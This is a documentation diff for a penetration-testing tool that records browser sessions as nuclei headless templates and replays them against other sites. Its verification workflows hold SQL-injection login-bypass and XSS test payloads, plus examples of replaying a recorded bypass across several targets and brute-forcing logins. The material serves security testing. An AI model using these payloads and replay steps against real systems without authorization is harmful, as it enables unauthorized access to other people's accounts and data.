@@ -129,11 +129,107 @@ playwright cookies <session> --set name=value [name2=value2]
 playwright cookies <session> --clear
 ```
 
+## Recording (nuclei headless template codegen)
+
+Record browser interactions as a nuclei-compatible headless YAML template. This is aiscan's equivalent of Playwright's `codegen` — but outputs nuclei headless YAML instead of test scripts.
+
+### Enable recording
+```bash
+# Method 1: record from the start
+playwright open http://target.com/login --session s1 --record
+
+# Method 2: enable on an existing session
+playwright record s1 --start
+```
+
+When `--record` is active, every interaction command (click, fill, press, select-option, wait-for, evaluate, etc.) is automatically captured as a nuclei headless action.
+
+### Export recorded template
+```bash
+playwright record s1 --dump                              # Print YAML to stdout
+playwright record s1 --save poc.yaml                     # Save to file
+playwright record s1 --save poc.yaml --id cve-2024-xxxx --name "Login bypass"  # With custom metadata
+```
+
+### Other recording controls
+```bash
+playwright record s1 --clear   # Clear recorded actions, keep recording
+playwright record s1 --stop    # Stop recording
+```
+
+### Run a recorded template against another target
+```bash
+playwright template poc.yaml http://other-target.com
+playwright template poc.yaml http://other-target.com --payload username=admin --payload password=test
+```
+
+The generated YAML is standard nuclei headless format — it can also be used with neutron or nuclei directly.
+
+### Recording workflow example
+```bash
+# 1. Record a login bypass POC
+playwright open http://target.com/login --session s1 --record
+playwright fill s1 "input[name=user]" "admin' OR '1'='1"
+playwright fill s1 "input[name=pass]" "x"
+playwright click s1 "button[type=submit]"
+playwright wait-for s1 --stable
+playwright text-content s1 "#welcome"
+playwright record s1 --save sqli-login.yaml --id sqli-login-bypass
+playwright close s1
+
+# 2. Replay against other targets
+playwright template sqli-login.yaml http://target2.com/login
+playwright template sqli-login.yaml http://target3.com/login
+```
+
+### What gets recorded
+
+| playwright command | nuclei headless action |
+|---|---|
+| `open --record` (initial) | `navigate` with `{{BaseURL}}` |
+| `click` | `click` |
+| `fill` / `type` | `text` |
+| `press` | `keyboard` |
+| `select-option` | `select` |
+| `evaluate` | `script` |
+| `wait-for --stable` | `waitstable` |
+| `wait-for --idle` | `waitidle` |
+| `wait-for <selector>` | `waitvisible` |
+| `text-content` / `inner-text` | `extract` (with auto-generated name) |
+| `get-attribute` | `extract` (target=attribute) |
+| `screenshot` | `screenshot` |
+| `set-extra-headers` | `setheader` (one per header) |
+| `dialog --arm` | `waitdialog` |
+| `hover` / `dblclick` / `reload` | `script` (JS fallback) |
+
+URLs are automatically templatized: the session's base origin is replaced with `{{BaseURL}}`. XPath selectors (`xpath:...`) are preserved as `by: xpath`.
+
+## Headless Template Execution
+
+Run a nuclei-compatible headless YAML template against a target URL. Shares the browser instance with sessions.
+
+```bash
+playwright template <file.yaml> <target-url> [--payload key=value ...]
+```
+
+Templates support the full nuclei headless action set (29 action types), DSL expressions (`{{rand_int()}}`, `{{replace()}}`, etc.), payload iteration (sniper/pitchfork/clusterbomb), template variables, matchers, and extractors.
+
+```bash
+# Run a CVE template
+playwright template cve-2024-xxxx.yaml http://target.com
+
+# Run with payload overrides
+playwright template login-brute.yaml http://target.com --payload username=admin --payload password=secret
+
+# Run a self-contained template (URL embedded in template)
+playwright template prototype-pollution-check.yaml http://target.com
+```
+
 ## Vulnerability Verification Workflows
 
-### XSS Verification
+### XSS Verification (with recording)
 ```bash
-playwright open http://target.com/search --session xss --ttl 0
+playwright open http://target.com/search --session xss --ttl 0 --record
 playwright discover xss
 playwright dialog xss --arm
 playwright fill xss "input[name=q]" "<script>alert('xss_canary_8f2a')</script>"
@@ -142,17 +238,21 @@ playwright wait-for xss --stable
 playwright dialog xss --check
 # If captured: {"type":"alert","message":"xss_canary_8f2a"} then confirmed
 playwright screenshot xss --output xss_evidence.png
+playwright record xss --save xss-poc.yaml --id reflected-xss
 playwright close xss
+# Replay against other targets:
+playwright template xss-poc.yaml http://target2.com/search
 ```
 
-### SQLi via Login Bypass
+### SQLi via Login Bypass (with recording)
 ```bash
-playwright open http://target.com/login --session sqli --ttl 0
+playwright open http://target.com/login --session sqli --ttl 0 --record
 playwright autofill sqli --form 0 --data "username=admin' OR '1'='1,password=x"
 playwright click sqli "button[type=submit]"
 playwright wait-for sqli --stable
 playwright goto sqli
 # Check for dashboard/admin content
+playwright record sqli --save sqli-poc.yaml --id sqli-login
 playwright close sqli
 ```
 
@@ -206,6 +306,15 @@ playwright close spa
 | `cookies` | `context.cookies()` |
 | `dialog --arm` | `page.on('dialog')` |
 | `network --start` | `page.on('request')` |
+
+## aiscan Extensions (no Playwright CLI equivalent)
+
+| command | purpose |
+|---|---|
+| `discover` | katana JS hooks — enumerate forms, buttons, event listeners, SPA routes, fetch/WebSocket URLs |
+| `autofill` | katana heuristics — smart form filling with auto-inferred values |
+| `record` | codegen — record session interactions as nuclei headless YAML (like Playwright's `codegen` but outputs YAML) |
+| `template` | run a nuclei-compatible headless YAML template against a target |
 
 ## Notes
 
